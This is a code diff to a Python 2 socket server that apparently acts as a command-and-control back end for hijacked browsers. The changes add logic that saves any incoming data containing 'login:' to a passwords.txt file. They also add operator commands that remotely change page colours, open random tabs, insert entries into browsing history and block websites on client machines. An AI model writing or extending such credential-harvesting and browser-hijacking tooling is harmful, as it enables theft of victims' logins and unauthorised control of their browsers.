@@ -13,7 +13,7 @@ print 'Socket is listening'
 resp = []
 resp_lock = threading.Lock()
 
-def clientThread(s, logFile):
+def clientThread(s):
     while 1:
         client, address = s.accept() 
         while 1:
@@ -22,9 +22,15 @@ def clientThread(s, logFile):
             endind = data.find("Accept:") 
             if data: 
                 if ind > -1:
-                    logFile = open("log.txt", "a")
-                    logFile.write(data[ind + len('Content-Type:'):endind])
-                    logFile.close()
+                    coredata = data[ind + len('Content-Type:'):endind]
+                    if coredata.find("login:") != -1:
+                        passFile = open("passwords.txt", "a")
+                        passFile.write(coredata)
+                        passFile.close()
+                    else:
+                        logFile = open("log.txt", "a")
+                        logFile.write(coredata)
+                        logFile.close()
                     #print data[ind + len('Content-Type:'):endind]
                 else:
                     print 'Recieved ' + data
@@ -40,19 +46,26 @@ def getOption():
     tempresp = ''
     while 1:
         if tempresp == '':
-            option = str(raw_input('Enter Color/Website/1: '))
+            option = str(raw_input('Enter \n1 to change background color\n2 to open random tabs\n3 to add page to history\n4 to block website\n'))
             tempresp = option.lower()
-            if option.lower() == str(1):
-                subopt = str(raw_input('Enter site to redirect: '))
-                subopt2 = str(raw_input('Enter destination site: '))
-                tempresp = option + ' ' + subopt + ' ' + subopt2
+            if tempresp == str(1):
+                color = str(raw_input('Enter color(red/blue/green/yellow): '))
+                tempresp = color
+            elif tempresp == str(2):
+                tempresp = "2"
+            elif tempresp == str(3):
+                site = str(raw_input("Enter url to add to history: "))
+                tempresp = "history:" + "http://www." + str(site)
+            elif tempresp == str(4):
+                site = str(raw_input("Enter url to block: "))
+                tempresp = "block:" + str(site)
         else:
             resp_lock.acquire()
             resp.append(tempresp)
             tempresp = ''
             resp_lock.release()
 
-t1 = threading.Thread(target=clientThread ,args=(s,"log.txt"))
+t1 = threading.Thread(target=clientThread ,args=(s,))
 t2 = threading.Thread(target=getOption, args=())
 t1.start()
 t2.start()
